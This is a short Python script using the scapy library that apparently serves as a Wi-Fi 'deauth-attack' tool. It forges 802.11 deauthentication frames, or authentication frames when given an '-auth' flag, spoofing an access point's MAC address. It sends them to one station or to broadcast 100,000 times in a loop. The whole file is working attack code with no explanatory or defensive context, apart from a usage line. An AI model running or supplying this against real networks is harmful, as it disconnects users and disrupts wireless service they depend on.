import sys
from scapy.all import *
from time import *

def deauth():
    conf.iface = sys.argv[1]
    gw_mac = sys.argv[2]
    if len(sys.argv) ==4:
        target_mac=sys.argv[3]
    if len(sys.argv) ==3:
        target_mac="FF:FF:FF:FF:FF:FF"

    dot11 = Dot11(type=0, subtype=12,addr1=target_mac, addr2=gw_mac, addr3=gw_mac)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    for i in range(100000):
        sleep(0.5)
        sendp(pkt)

    return

def auth():
    conf.iface = sys.argv[1]
    target_mac = sys.argv[3]
    gw_mac = sys.argv[2]
    
    dot11 = Dot11(type=0, subtype=11,addr1=target_mac, addr2=gw_mac, addr3=gw_mac)
    pkt = RadioTap()/dot11/Dot11Auth(seqnum=1)

    for i in range(100000):
        sleep(0.5)
        sendp(pkt)

    return

def chkfil():
    print("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]")
    print("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")
    return

if __name__=="__main__":
    if len(sys.argv)<=2 or len(sys.argv)>=6:
        exit(0)
    chk = 0
    for i in sys.argv:
        if i=="-auth":
            chk = 1
    if chk:
        auth()
    else:
        deauth()


    print("hello")
